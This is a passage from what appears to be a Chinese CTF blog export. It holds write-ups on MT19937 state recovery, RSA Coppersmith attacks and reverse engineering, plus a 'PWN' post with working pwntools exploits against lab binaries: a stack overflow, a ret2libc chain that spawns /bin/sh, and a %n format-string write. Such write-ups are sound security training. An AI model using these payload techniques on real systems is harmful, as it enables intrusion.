&gt;&gt; (32 - shift))) &amp; 0xffffffff def cs2r(y, shift): return ((y &gt;&gt; shift) ^ (y &lt;&lt; (32 - shift))) &amp; 0xffffffffdef recover_MT(t): for i1 in range(7): t=t^cs2r(t,7) ^cs2r(t,19) for i2 in range(7): t=(t^cs2l(t,11)^cs2l(t,15)) return t# y=int(os.urandom(4).hex(),16)# t=y# y = y ^ cs2l(y, 11) ^ cs2l(y,15)# y = y ^ cs2r(y,7) ^ cs2r(y,19)# print(t==recover_MT(y))MT_227=recover_MT(see_227)MT_0_ed=recover_MT(see_0_ed)# GET MT_228 ASSUME y&amp;1==0，p=3/4y_227=(MT_227^MT_0_ed)&lt;&lt;1MT_228=y_227&amp;0x7fffffff #假设最高为为0，概率为1/2#GET MT_397MT_397=MT_228for i in range(169):#397-228=169 MT_397 = 2037740385 * ( MT_397 ^ (MT_397 &gt;&gt; 30)) + 1 MT_397 = MT_397 &amp; 0xffffffff#GET MT_1,MT1=(MT_0_ed^MT_397)&lt;&lt;1MT_1=(MT_0_ed^MT_397)&lt;&lt;1 #再次假设y&amp;1==0#GET MT_0-&gt;SEEDseed=(MT_1-1)*gmpy2.invert(2037740385,1&lt;&lt;32)%(1&lt;&lt;32)seed=seed^(seed&gt;&gt;30)print(seed)# assert seed==secretprint('end') DASCTF{0d9f7e89-833b-4571-90bb-ea106bac31b4} Yusa的密码学课堂——三行情书Description123import randomoutput=[random.getrandbits(32) &amp; 2037740385 for i in range(2000)]flag = 'DASCTF{'+hex(random.getrandbits(32*4))[2:] + '}' # DASCTF{3797****************************} 好短的题目，只有三行（可能这就是出题人的三行情书吧 Analyse在做题前，得先了解梅森旋转算法，python中默认的随机数生成算法为MT19937，也就是本题中采用的随机数生成算法 1234567891011121314151617181920212223242526272829def _int32(x): return int(0xFFFFFFFF &amp; x)class MT19937: # 根据seed初始化624的state def __init__(self, seed): self.mt = [0] * 624 self.mt[0] = seed self.mti = 0 for i in range(1, 624): self.mt[i] = _int32(1812433253 * (self.mt[i - 1] ^ self.mt[i - 1] &gt;&gt; 30) + i) # 提取伪随机数 def extract_number(self): if self.mti == 0: self.twist() y = self.mt[self.mti] y = y ^ y &gt;&gt; 11 y = y ^ y &lt;&lt; 7 &amp; 2636928640 y = y ^ y &lt;&lt; 15 &amp; 4022730752 y = y ^ y &gt;&gt; 18 self.mti = (self.mti + 1) % 624 return _int32(y) # 对状态进行旋转 def twist(self): for i in range(0, 624): y = _int32((self.mt[i] &amp; 0x80000000) + (self.mt[(i + 1) % 624] &amp; 0x7fffffff)) self.mt[i] = (y &gt;&gt; 1) ^ self.mt[(i + 397) % 624] ReverseWER看了wp后血压上来了，明明调到了flag，却因为大小端没弄好交错了flag(╯▔皿▔)╯ 不过题目里涉及的知识点还是要学学的 题目设计是通过windows的WER机制来隐藏控制流 12345678910111213141516class Test {public: Test() { atexit(OnExit); PVOID pvParameter = NULL; DWORD dwPingInterval = RECOVERY_DEFAULT_PING_INTERVAL; DWORD dwFlags = 0; HRESULT hRes = RegisterApplicationRecoveryCallback(ApplicationRecoverCallback, pvParameter, dwPingInterval, dwFlags); }};void OnExit(){ WerReportHang(GetForegroundWindow(), NULL); TriggerException();} 关于 WER - Win32 apps | Microsoft Docs Windows 错误报告 (WER) 是一种灵活的基于事件的反馈基础结构，旨在收集有关Windows可以检测、向 Microsoft 报告信息以及为用户提供任何可用解决方案的硬件和软件问题的相关信息。 然后在类初始化时注册一个ApplicationRecoverCallback回调，可以在main函数前完成 ApplicationRecoveryCallback callback function (Windows) | Microsoft Docs) 在onExit中调用WerReportHang并触发异常，使真正的逻辑执行 WerReportHang function (errorrep.h) - Win32 apps | Microsoft Docs 在ida的import界面中搜WER，能够搜到触发异常的WerReportHang import里搜ApplicationRecoverFinished，能够找到程序的真正逻辑，也就能得到flag了 就是一个简单的异或： 12345678a =[ 0x05, 0x03, 0x55, 0x05,0x04, 0x07, 0x5E, 0x54,0x05, 0x07, 0x50, 0x02,0x03, 0x53, 0x5F, 0x50,0x53, 0x50, 0x53, 0x05, 0x55, 0x00, 0x54, 0x55,0x57, 0x03, 0x05, 0x02,0x52, 0x50, 0x51, 0x53]f=''for i in a: f+=chr(i^102)print(f) Misc不懂PCB的厨师不是好黑客下载附件，010editor打开PCB，搜索DASCTF直接得到flag 参考： DASCTF｜2022DASCTF May出题人挑战赛官方Write (qq.com) 浅析MT19937伪随机数生成算法 - 安全客，安全资讯平台 (anquanke.com) 梅森旋转算法 - 维基百科，自由的百科全书 (wikipedia.org)","link":"/2022/05/27/DASCTF-MAY/"},{"title":"Crypto-CopperSmith","text":"在RSA问题中，已知部分二进制位，可以通过coppersmith攻击还原出所有的二进制位。而借助格密码理论并从此扩展开来，对于其他的非对称密码算法，同样可以已知部分二进制位而还原所有的二进制位。 [toc] 定理本身现有一个 $e$ 阶的多项式 $f$ ，可以： 给定 $\\beta$ ，快速求出模某个 $n$ 的因数 $b$ 意义下较小的根，其中 $b \\geq n^{\\beta}, (0&lt;\\beta\\leq1)$ 在模 $b$ 意义下，快速求出 $n^{\\frac{\\beta^2}{e}}$ 以内的根 应用：高位攻击应用了第二条性质，此时构造的多项式 $f=p_{high}+p_{unknown}$，阶数 $e=1$ $\\beta$ 的定义：n的某个因数$ b$使得 $b\\geq n^{\\beta},(0&lt;\\beta \\leq 1)$ 而对于RSA问题，因数b一般为p或q。在p和q位数都为1024位的情况下，$\\beta=0.49$ 能够满足条件，即492位左右。其他情况则具体分析了。 在sagemath中应用coppersmith定理的函数有两个：small_root,coppersmith_howgrave_univariate 关于small_roots的使用方法： small_roots(X = ,beta = ) 有两个参数 X代表所需要求解根的上限；虽然是根的上限，并不是说上限越高越好，当上限超过某个值的时候就会计算失效，即使已知二进制位数满足条件，也无法用此函数求得结果；所以一般来说X取在给定情况下的最大求解上限 beta即是前面提到的β \\betaβ ，当p,q二进制位数相同时一般只能取0.4 0.40.4；如果p,q二进制位数不同，就按照之前的方法具体问题具体分析 实际操作下，未知位数小于等于454bits时(p,q均为1024bits)，可以运行coppersmith求解 123456789from Crypto.Util.number import getPrimep = getPrime(int(1024))q = getPrime(int(1024))n = p * qtest_bits = 454p_h = p &gt;&gt; test_bitsR.&lt;x&gt; = PolynomialRing(Zmod(n))f = (p_h &lt;&lt; test_bits) + xf.small_roots(2**test_bits,0.4) 攻击类型Broadcast Attack with Linear PaddingRelated Message Attack当使用同一公钥对两个具有某种线性关系的消息 $M_1$ 和 $M_2$ 进行加密得到了 $C_1$ 和 $C_2$ ，若敌手获得了密文对，则可能可以获得对应的 $M_1$ 和 $M_2$。假设模数为 $N$ ，线性关系如下 M_1\\equiv f(M_2)\\ mod N \\\\ f=ax+b那么我们可以知道 C_1\\equiv M_1^e\\ mod\\ N\\\\ f(M_2)^e\\equiv M_1^e\\ mod\\ N\\\\ (aM_2+B)^e-C_1 \\equiv 0\\ mod\\ N以及 M_2^e-C_2\\equiv 0\\ mod\\ N也就是说，$M_2$是这两个式子的根，即 $x-M_2$ 同时整除这两个式子 f(x)^e-C_1\\\\ x^e-C_2因此，我们可以求得这两个多项式的最大公因子，如果最大公因子恰好是线性的，那么我们就求得了 $M_2$ ，值得注意的是 $e=3$ 时，最大公因子一定是线性的，证明过程可参考Coppersmith 相关攻击 - CTF Wiki (ctf-wiki.org)，这里直接引用结果 M_2\\equiv \\frac{2a^3bC_2-b^4+C_1b}{aC_1-a^4C_2+2ab^3}或者用sage，可以更简单地处理 1234567891011121314151617181920212223import binasciidef attack(c1, c2, b, e, n): PR.&lt;x&gt;=PolynomialRing(Zmod(n)) g1 = x^e - c1 g2 = (x+b)^e - c2 def gcd(g1, g2): while g2: g1, g2 = g2, g1 % g2 return g1.monic() return -gcd(g1, g2)[0]c1 = 0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c5bb724d1cee07e221e028d9b8bc24360208840fbdfd4794733adcac45c38ad0225fde19a6a4c38e4207368f5902c871efdf1bdf4760b1a98ec1417893c8fce8389b6434c0fee73b13c284e8c9fb5c77e420a2b5b1a1c10b2a7a3545e95c1d47835c2718Lc2 = 0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c72722fe4fe5a901e2531b3dbcb87e5aa19bbceecbf9f32eacefe81777d9bdca781b1ec8f8b68799b4aa4c6ad120506222c7f0c3e11b37dd0ce08381fabf9c14bc74929bf524645989ae2df77c8608d0512c1cc4150765ab8350843b57a2464f848d8e08Ln = 25357901189172733149625332391537064578265003249917817682864120663898336510922113258397441378239342349767317285221295832462413300376704507936359046120943334215078540903962128719706077067557948218308700143138420408053500628616299338204718213283481833513373696170774425619886049408103217179262264003765695390547355624867951379789924247597370496546249898924648274419164899831191925127182066301237673243423539604219274397539786859420866329885285232179983055763704201023213087119895321260046617760702320473069743688778438854899409292527695993045482549594428191729963645157765855337481923730481041849389812984896044723939553e=3a = 1id1 = 1002id2 = 2614b = id2 - id1m1 = attack(c1,c2, b,e,n)print binascii.unhexlify(&quot;%x&quot; % int(m1 - id1)) Coppersmith’s short-pad attack如果padding长度过短，可能会导致对应的多项式的根过小，使得容易被攻击 设消息为M，padding长度为 $m=\\lfloor \\frac{k}{e^2} \\rfloor$ ，$M$ 的长度最多为k-m比特，padding方式如下 M_1=2^mM+r_1, 0\\le r_1\\le 2^m有 g_1(x)=x^e-C_1\\\\ g_2(x)=(x+r_2-r_1)-C_2显然两个方程具有同样的根 $M_1$ github上找的脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192# Franklin-Reiter attack against RSA.# If two messages differ only by a known fixed difference between the two messages# and are RSA encrypted under the same RSA modulus N# then it is possible to recover both of them.# Inputs are modulus, known difference, ciphertext 1, ciphertext2.# Ciphertext 1 corresponds to smaller of the two plaintexts. (The one without the fixed difference added to it)def franklinReiter(n,e,r,c1,c2): R.&lt;X&gt; = Zmod(n)[] f1 = X^e - c1 f2 = (X + r)^e - c2 # coefficient 0 = -m, which is what we wanted! return Integer(n-(compositeModulusGCD(f1,f2)).coefficients()[0]) # GCD is not implemented for rings over composite modulus in Sage # so we do our own implementation. Its the exact same as standard GCD, but with # the polynomials monic representationdef compositeModulusGCD(a, b): if(b == 0): return a.monic() else: return compositeModulusGCD(b, a % b)def CoppersmithShortPadAttack(e,n,C1,C2,eps=1/30): &quot;&quot;&quot; Coppersmith's Shortpad attack! Figured out from: https://en.wikipedia.org/wiki/Coppersmith's_attack#Coppersmith.E2.80.99s_short-pad_attack &quot;&quot;&quot; import binascii P.&lt;x,y&gt; = PolynomialRing(ZZ) ZmodN = Zmod(n) g1 = x^e - C1 g2 = (x+y)^e - C2 res = g1.resultant(g2) P.&lt;y&gt; = PolynomialRing(ZmodN) # Convert Multivariate Polynomial Ring to Univariate Polynomial Ring rres = 0 for i in range(len(res.coefficients())): rres += res.coefficients()[i]*(y^(res.exponents()[i][1])) diff = rres.small_roots(epsilon=eps) recoveredM1 = franklinReiter(n,e,diff[0],C1,C2) print(recoveredM1) print(&quot;Message is the following hex, but potentially missing some zeroes in the binary from the right end&quot;) print(hex(recoveredM1)) print(&quot;Message is one of:&quot;) for i in range(8): msg = hex(Integer(recoveredM1*pow(2,i))) if(len(msg)%2 == 1): msg = '0' + msg if(msg[:2]=='0x'): msg = msg[:2] print(binascii.unhexlify(msg))def testCoppersmithShortPadAttack(eps=1/25): from Crypto.PublicKey import RSA import random import math import binascii M = &quot;flag{This_Msg_Is_2_1337}&quot; M = int(binascii.hexlify(M),16) e = 3 nBitSize = 8192 key = RSA.generate(nBitSize) #Give a bit of room, otherwhise the epsilon has to be tiny, and small roots will take forever m = int(math.floor(nBitSize/(e*e))) - 400 assert (m &lt; nBitSize - len(bin(M)[2:])) r1 = random.randint(1,pow(2,m)) r2 = random.randint(r1,pow(2,m)) M1 = pow(2,m)*M + r1 M2 = pow(2,m)*M + r2 C1 = Integer(pow(M1,e,key.n)) C2 = Integer(pow(M2,e,key.n)) CoppersmithShortPadAttack(e,key.n,C1,C2,eps)def testFranklinReiter(): p = random_prime(2^512) q = random_prime(2^512) n = p * q # 1024-bit modulus e = 11 m = randint(0, n) # some message we want to recover r = randint(0, n) # random padding c1 = pow(m + 0, e, n) c2 = pow(m + r, e, n) print(m) recoveredM = franklinReiter(n,e,r,c1,c2) print(recoveredM) assert recoveredM==m print(&quot;They are equal!&quot;) return True Known High Bits Message AttackFactoring with High Bits KnownBoneh and Durfee attack$d&lt;N^{0.292}$时，可以使用该攻击 练习题目：[鹤城杯 2021]babyrsaDescription:123456789101112131415from Crypto.Util.number import getPrime, bytes_to_longfrom secret import flagp = getPrime(1024)q = getPrime(1024)n = p * qe = 65537hint1 = p &gt;&gt; 724hint2 = q % (2 ** 265)ct = pow(bytes_to_long(flag), e, n)print(hint1)print(hint2)print(n)print(ct) Analysis Solving code123456789101112131415161718192021222324252627from Crypto.Util.number import *import gmpy2p_high = 1514296530850131082973956029074258536069144071110652176122006763622293335057110441067910479q_low = 40812438243894343296354573724131194431453023461572200856406939246297219541329623n = 21815431662065695412834116602474344081782093119269423403335882867255834302242945742413692949886248581138784199165404321893594820375775454774521554409598568793217997859258282700084148322905405227238617443766062207618899209593375881728671746850745598576485323702483634599597393910908142659231071532803602701147251570567032402848145462183405098097523810358199597631612616833723150146418889589492395974359466777040500971885443881359700735149623177757865032984744576285054725506299888069904106805731600019058631951255795316571242969336763938805465676269140733371287244624066632153110685509892188900004952700111937292221969enc = 19073695285772829730103928222962723784199491145730661021332365516942301513989932980896145664842527253998170902799883262567366661277268801440634319694884564820420852947935710798269700777126717746701065483129644585829522353341718916661536894041337878440111845645200627940640539279744348235772441988748977191513786620459922039153862250137904894008551515928486867493608757307981955335488977402307933930592035163126858060189156114410872337004784951228340994743202032248681976932591575016798640429231399974090325134545852080425047146251781339862753527319093938929691759486362536986249207187765947926921267520150073408188188e = 65537mod = pow(2,265)p0 = n * inverse_mod(q_low,mod) % modPR.&lt;x&gt; = PolynomialRing(Zmod(n))for i in range(2**5): f = p_high * (2^724) + p0 + (x * 32 + i) * mod f = f.monic() out_p = f.small_roots(2^454,0.4) if len(out_p) != 0: print(out_p[0]) breakp = (out_p[0] * 32 + i) * mod + p_high * (2^724) + p0# print(p)p = 133637329398256221348922087205912367118213472434713498908220867690672019569057789598459580146410501473689139466275052698529257254973211963162087316149628000798221014338373126500646873612341158676084318494058522014519669302359038980726479317742766438142835169562422371156257894374341629012755597863752154328407assert n % p == 0q = n // pfai_n = (p-1) * (q-1)d = inverse_mod(e,fai_n)m = pow(enc,d,n)print(bytes.decode(long_to_bytes(m))) 强网杯2019 Copperstudychallenge1明文泄露高位 1234567891011121314151617[+]Generating challenge 1 [+]n=13112061820685643239663831166928327119579425830632458568801544406506769461279590962772340249183569437559394200635526183698604582385769381159563710823689417274479549627596095398621182995891454516953722025068926293512505383125227579169778946631369961753587856344582257683672313230378603324005337788913902434023431887061454368566100747618582590270385918204656156089053519709536001906964008635708510672550219546894006091483520355436091053866312718431318498783637712773878423777467316605865516248176248780637132615807886272029843770186833425792049108187487338237850806203728217374848799250419859646871057096297020670904211 [+]e=3[+]m=random.getrandbits(512)[+]c=pow(m,e,n)=15987554724003100295326076036413163634398600947695096857803937998969441763014731720375196104010794555868069024393647966040593258267888463732184495020709457560043050577198988363754703741636088089472488971050324654162166657678376557110492703712286306868843728466224887550827162442026262163340935333721705267432790268517[+]((m&gt;&gt;72)&lt;&lt;72)=2519188594271759205757864486097605540135407501571078627238849443561219057751843170540261842677239681908736[-]long_to_bytes(m).encode('hex')=$ 464c41477b325e3872736137353839363933666336383963373763356635323632643635343237323432377dchallenge1 completed solve: 123456789101112from Crypto.Util.number import *import gmpy2n=13112061820685643239663831166928327119579425830632458568801544406506769461279590962772340249183569437559394200635526183698604582385769381159563710823689417274479549627596095398621182995891454516953722025068926293512505383125227579169778946631369961753587856344582257683672313230378603324005337788913902434023431887061454368566100747618582590270385918204656156089053519709536001906964008635708510672550219546894006091483520355436091053866312718431318498783637712773878423777467316605865516248176248780637132615807886272029843770186833425792049108187487338237850806203728217374848799250419859646871057096297020670904211e=3c=15987554724003100295326076036413163634398600947695096857803937998969441763014731720375196104010794555868069024393647966040593258267888463732184495020709457560043050577198988363754703741636088089472488971050324654162166657678376557110492703712286306868843728466224887550827162442026262163340935333721705267432790268517m_high=2519188594271759205757864486097605540135407501571078627238849443561219057751843170540261842677239681908736bits=72P.&lt;x&gt;=PolynomialRing(Zmod(n))f=(m_high+x)^e-cm_low=f.small_roots(2&lt;&lt;bits,0.4)m=m_high+m_low[0]print(hex(m)[2:].zfill(64)) challenge2description 因子高位泄露攻击 1234567891011121314151617[+]Generating challenge 2 [+]n=12784625729032789592766625203074018101354917751492952685083808825504221816847310910447532133616954262271205877651255598995305639194329607493047941212754523879402744065076183778452640602625242851184095546100200565113016690161053808950384458996881574266573992526357954507491397978278604102524731393059303476350167738237822647246425836482533150025923051544431330502522043833872580483142594571802189321599016725741260254170793393777293145010525686561904427613648184843619301241414264343057368192416551134404100386155751297424616254697041043851852081071306219462991969849123668248321130382231769250865190227630009181759219 [+]e=65537[+]m=random.getrandbits(512)[+]c=pow(m,e,n)=627824086157119245056478875800598959553774250161670787506083253960788230737588761787385686125828765665617567887904228030839535317987589608761534500003128247164233774794784231518212804270056404565710426613938264302998015421153393879729263551292024543756422702956470022959537221269172084619081368498693930550456153543628170306324206266216348386707008661128717431426237486511309767286175518238620230507201952867261283880986868752676549613958785288914989429224582849218395471672295410036858881836363364885164276983237312235831591858044908369376855484127614933545955544787160352042318378588039587911741028067576722790778[+]((p&gt;&gt;128)&lt;&lt;128)=97522826022187678545924975588711975512906538181361325096919121233043973599759518562689050415761485716705615149641768982838255403594331293651224395590747133152128042950062103156564440155088882592644046069208405360324372057140890317518802130081198060093576841538008960560391380395697098964411821716664506908672[-]long_to_bytes(m).encode('hex')=$ 464c41477b325e3872736136653237376633353564626536646133656464366633353664326462366436667dchallenge2 completed solve: 12345678910111213141516171819from gmpy2 import invertn=12784625729032789592766625203074018101354917751492952685083808825504221816847310910447532133616954262271205877651255598995305639194329607493047941212754523879402744065076183778452640602625242851184095546100200565113016690161053808950384458996881574266573992526357954507491397978278604102524731393059303476350167738237822647246425836482533150025923051544431330502522043833872580483142594571802189321599016725741260254170793393777293145010525686561904427613648184843619301241414264343057368192416551134404100386155751297424616254697041043851852081071306219462991969849123668248321130382231769250865190227630009181759219e=65537c=627824086157119245056478875800598959553774250161670787506083253960788230737588761787385686125828765665617567887904228030839535317987589608761534500003128247164233774794784231518212804270056404565710426613938264302998015421153393879729263551292024543756422702956470022959537221269172084619081368498693930550456153543628170306324206266216348386707008661128717431426237486511309767286175518238620230507201952867261283880986868752676549613958785288914989429224582849218395471672295410036858881836363364885164276983237312235831591858044908369376855484127614933545955544787160352042318378588039587911741028067576722790778p_high=97522826022187678545924975588711975512906538181361325096919121233043973599759518562689050415761485716705615149641768982838255403594331293651224395590747133152128042950062103156564440155088882592644046069208405360324372057140890317518802130081198060093576841538008960560391380395697098964411821716664506908672bits=128P.&lt;x&gt;=PolynomialRing(Zmod(n))f=(p_high)+xp_low=f.small_roots(2&lt;&lt;bits,0.4)[0]p=p_high+p_lowprint(p)p=97522826022187678545924975588711975512906538181361325096919121233043973599759518562689050415761485716705615149641768982838255403594331293651224395590747133152128042950062103156564440155088882592644046069208405360324372057140890317518802130081198060093576841538008960560661715295741651653499691458486798196487q=n//pprint(q)phi=(p-1)*(q-1)d=invert(e,phi)m=pow(c,d,n)print(hex(m)[2:].zfill(64)) challenge3description 私钥低位泄露 1234567891011121314151617[+]Generating challenge 3 [+]n=92896523979616431783569762645945918751162321185159790302085768095763248357146198882641160678623069857011832929179987623492267852304178894461486295864091871341339490870689110279720283415976342208476126414933914026436666789270209690168581379143120688241413470569887426810705898518783625903350928784794371176183 [+]e=3[+]m=random.getrandbits(512)[+]c=pow(m,e,n)=56164378185049402404287763972280630295410174183649054805947329504892979921131852321281317326306506444145699012788547718091371389698969718830761120076359634262880912417797038049510647237337251037070369278596191506725812511682495575589039521646062521091457438869068866365907962691742604895495670783101319608530[+]d&amp;((1&lt;&lt;512)-1)=787673996295376297668171075170955852109814939442242049800811601753001897317556022653997651874897208487913321031340711138331360350633965420642045383644955[-]long_to_bytes(m).encode('hex')=$ 464c41477b325e3872736135616230383637343566366563373435363139613862363566653465633536307dchallenge3 completed solve 公钥e和私钥d满足： e*d = k*(p-1)*(q-1)两边乘p e*d*p=k*(p^2-1)*(n-1)模上1&lt;&lt;512 e*d_{low}*p_{low}=k*(p^2_{low}-n-p^2_{low}) mod\\ 1","link":"/2022/04/24/Crypto-CopperSmith/"},{"title":"PWN(1)","text":"初学pwn，在新手区逛一逛 [TOC] guess_numchecksec一下 然后拖进ida，进到main函数 程序主体就是一个猜数字的游戏，全部都猜对了就给flag（我们一般称这种人为赌怪） 问题出在了gets()函数（是它，又是它！） 观察主程序的栈，通过向v7输入长度为0x20的串后即可覆盖seed，借此控制了seed后就能够预先知道随机数的取值了。然后使用1(int)为种子写了一个简单的脚本 12345678from pwn import *# a=process(&quot;./b59204f56a0545e8a22f8518e749f19f&quot;)a=remote(&quot;111.200.241.244&quot;,&quot;63680&quot;)a.sendlineafter(&quot;name:&quot;,b&quot;a&quot;*0x20+b&quot;\\x00&quot;*7+b&quot;\\x01&quot;)a.interactive()#接下来依次输入以下数字即可2 5 4 2 6 2 5 1 4 2 话说只猜10次，每六分之一的概率，似乎可以暴力猜测（未曾设想的道路） int_overflowchecksec一下 拖进ida，发现有后门函数，同时没有开canary，大概是栈溢出覆盖返回地址了 程序问题在于读入了0x199长度的字符串并将其传入check_passwd函数，在该函数中又通过strcpy()函数将读入的字符串赋给了dest，而dest的栈空间只有0x14-0x9那么大，因此能借此覆盖该函数的返回值。 那么现在的问题在于如何绕开if的判断限制 观察v3的类型，其最大值仅为255而已，当s长度为260~264时，由于数值溢出v3的值依然是处于4~8，由此我们可以构造出解题脚本 1234567from pwn import *# a=process(&quot;./a.out&quot;)a=remote(&quot;111.200.241.244&quot;,&quot;59671&quot;)a.sendlineafter(&quot;choice:&quot;,&quot;1&quot;)a.sendlineafter(&quot;username:\\n&quot;,&quot;abc&quot;)a.sendlineafter(&quot;passwd:\\n&quot;,b&quot;a&quot;*0x18+p32(0x0804868b)+b&quot;a&quot;*232)a.interactive() 得到flag:cyberpeace{f6af6201f84108f5701dab55abbb5c3f} cgpwn2checksec一下 扔进ida，发现有后门函数_system()，但是没有””/bin/sh”。发现有gets()，且name存放在bss段，不会被清除，随后进行一个栈的溢出 编写脚本： 123456from pwn import *# a=process(&quot;./53c24fc5522e4a8ea2d9ad0577196b2f&quot;)a=remote(&quot;111.200.241.244&quot;,&quot;50787&quot;)a.sendlineafter(&quot;name&quot;,&quot;/bin/sh&quot;)a.sendlineafter(&quot;here&quot;,b&quot;a&quot;*0x2a+p32(0x08048420)+4*b&quot;a&quot;+p32(0x0804a080))a.interactive() 获得flag level3checksec一下 用ida打开，主要问题在以下函数： 1234567ssize_t vulnerable_function(){ char buf[136]; // [esp+0h] [ebp-88h] BYREF write(1, &quot;Input:\\n&quot;, 7u); return read(0, buf, 0x100u);} 定义了长度为136的数组，却接受了0x100长度的输入，存在栈溢出的漏洞 level3中并没有system()函数和/bin/sh的字符串，要到所给的另一个附件Libc中找 首先通过覆盖返回值，使其执行write函数，输出got表中的地址，在计算偏移地址 从而得到libc中system函数在运行时的真正地址和/bin/sh字符串的地址 从而第二次执行栈溢出，覆盖返回地址为计算出的system的真正运行地址 附上脚本： 1234567891011121314151617181920212223242526272829# -*- coding: UTF-8 -*-from pwn import *r=remote(&quot;111.200.241.244&quot;,&quot;51966&quot;)elf=ELF(&quot;./level3&quot;)writeplt=elf.plt[&quot;write&quot;]writegot=elf.got[&quot;write&quot;]func=elf.symbols[&quot;vulnerable_function&quot;]libc=ELF(&quot;./libc_32.so.6&quot;)writelibc=libc.symbols[&quot;write&quot;]syslibc=libc.symbols[&quot;system&quot;]binlibc=libc.search(b&quot;/bin/sh&quot;).__next__()payload1=b'a'*0x88+b'aaaa'+p32(writeplt)+p32(func)+p32(1)+p32(writegot)+p32(4)#再次返回func函数为了是进行二次溢出，后面三个分别是wirte函数的参数# 1表示标准输出流stdout,中间是write是要输出的地址，这里要输出writegot，4是输出的长度r.recvuntil(&quot;Input:\\n&quot;)r.sendline(payload1)writeaddr=u32(r.recv(4))sysaddr=writeaddr-writelibc+syslibcbinaddr=writeaddr-writelibc+binlibcpayload2=b'a'*0x88+b'bbbb'+p32(sysaddr)+p32(0xaaaa)+p32(binaddr)r.recvuntil(&quot;Input:\\n&quot;)r.sendline(payload2)r.interactive() 得到flag:cyberpeace{74ba6840cf36f19427c62624ab180b50} CGfsbchecksec一下 扔进ida，看到printf(s)，可以知道与字符串漏洞有关 123456789101112131415161718192021222324252627282930313233int __cdecl main(int argc, const char **argv, const char **envp){ _DWORD buf[2]; // [esp+1Eh] [ebp-7Eh] BYREF __int16 v5; // [esp+26h] [ebp-76h] char s[100]; // [esp+28h] [ebp-74h] BYREF unsigned int v7; // [esp+8Ch] [ebp-10h] v7 = __readgsdword(0x14u); setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); buf[0] = 0; buf[1] = 0; v5 = 0; memset(s, 0, sizeof(s)); puts(&quot;please tell me your name:&quot;); read(0, buf, 0xAu); puts(&quot;leave your message please:&quot;); fgets(s, 100, stdin); printf(&quot;hello %s&quot;, (const char *)buf); puts(&quot;your message is:&quot;); printf(s); if ( pwnme == 8 ) { puts(&quot;you pwned me, here is your flag:\\n&quot;); system(&quot;cat flag&quot;); } else { puts(&quot;Thank you!&quot;); } return 0;} 看伪代码，需要pwnme=8才能得到flag，双击得到地址0x0804a068 接着看偏移量，得到偏移量为10 构造payload，通过%n偏移10来改变pwnme的值 123456from pwn import *a=process(&quot;e41a0f684d0e497f87bb309f91737e4d&quot;)a.sendafter(&quot;name:&quot;,&quot;abc&quot;)payload=p32(0x0804a068)+b&quot;aaaa&quot;+b&quot;%10$n&quot;a.sendafter(&quot;please&quot;,payload)a.interactive() 得到flag （服务器又又又开摆了，开不了靶机交互不了，无语了）","link":"/2022/02/08/PWN-1/"},{"title":"Reverse 3","text":"[FlareOn2]very_success拖进ida开始分析 关键在sub_401084中，点进去查看 12345678910111213141516171819202122232425262728293031323334353637383940414243int __usercall sub_401084@&lt;eax&gt;(int result@&lt;eax&gt;, int a2, char *input, int a4){ __int16 v4; // bx int v5; // ecx _BYTE *v7; // edi char v8; // al unsigned int v9; // kr00_4 char v10; // al char v11; // cf __int16 v12; // ax bool v13; // zf _BYTE *v14; // edi int v15; // [esp+0h] [ebp-Ch] v4 = 0; v5 = 37; if ( a4 &gt;= 37 ) { v7 = (_BYTE *)(a2 + 36); while ( 1 ) { LOWORD(result) = 455; v15 = result; v8 = *input++; v9 = __readeflags(); v10 = v15 ^ v8; __writeeflags(v9); v12 = (unsigned __int8)(__ROL1__(1, v4 &amp; 3) + v11 + v10);//加密 v4 += v12; v13 = *v7 == (unsigned __int8)v12; //此行进行对比 v14 = v7 + 1; if ( !v13 ) // v13需要=1 LOWORD(v5) = 0; result = v15; if ( !v5 ) break; v7 = v14 - 2; if ( !--v5 ) return result; } } return 0;}//为便于阅读，代码有改动 可以发现加密流程就是将输入的字符与一个常数result异或后，与常数v11和1&lt;&lt;(v4&amp;3)相加，每一次循环后v4便加上v12的值 通过v12和v7的值的对比可以判断flag是否正确，因此关键在于得到v7的值 动调得到v7中的值： 接着通过动调发现v11的值在加密时始终为1（这点比较诡异，在未加密是v11的值会在0、1间反复横跳） 最终写出解题脚本： 123456789101112131415161718def rol(a,b): return (a&lt;&lt;b)|(a&gt;&gt;(8-b))&amp;0xffa=[0xAA ,0xEC ,0xA4 ,0xBA ,0xAF ,0xAE ,0xAA,0x8A ,0xC0 ,0xA7 ,0xB0 ,0xBC ,0x9A ,0xBA ,0xA5 ,0xA5 ,0xBA ,0xAF ,0xB8 ,0x9D ,0xB8 ,0xF9 ,0xAE,0x9D ,0xAB ,0xB4 ,0xBC ,0xB6 ,0xB3 ,0x90 ,0x9A ,0xA8 ]a=a[::-1]v4=0v11=0flag=[]for i in a: v10=(i-rol(1,v4&amp;3)-1)%256 v4+=i flag.append(v10^0x1901c7%256)str=''for i in flag: str+=chr(i)print(str)#a_Little_b1t_harder_plez@flare-o 结合题目提示，得到flag:flag{a_Little_b1t_harder_plez@flare-on.com} [CISCN2018]2ex拖进ida,shift+f12看字符串 结合out.txt内容： 1│_r-+_Cl5;vgq_pdme7#7eC0= 有理由怀疑这是base64变种 继续跟踪，发现这个函数，显然是base64的编码 码表为 尝试将out.txt中内容根据码表内容进行解码，得到flag:flag{change53233} [SCTF2019]Who is he下载压缩包，发现是unity游戏，打开运行一下 发现是一段鬼畜视频，挺带感的 把Assembly-CSharp.dll拖进dnSpy中，找到OnClick()函数，发现是将输入的数据与解密后的已加密的flag进行对比从而判断正确 12345678910111213141516public void OnClick(){ Debug.Log(&quot;Button Clicked. TestClick.&quot;); Debug.Log(this.Name.text); bool flag = this.Name.text.Equals(this.Decrypt(this.EncryptData)); if (flag) { Debug.Log(&quot;Right&quot;); TestClick.Messagebox.MessageBox(IntPtr.Zero, &quot;Haha, same as you!&quot;, &quot;Info:&quot;, 0); } else { Debug.Log(&quot;Wrong&quot;); TestClick.Messagebox.MessageBox(IntPtr.Zero, &quot;Emmmmm,I don't think so.&quot;, &quot;Info:&quot;, 0); }} 查看解密函数 123456789101112131415161718192021222324private string Decrypt(string str){ string result; try { byte[] bytes = 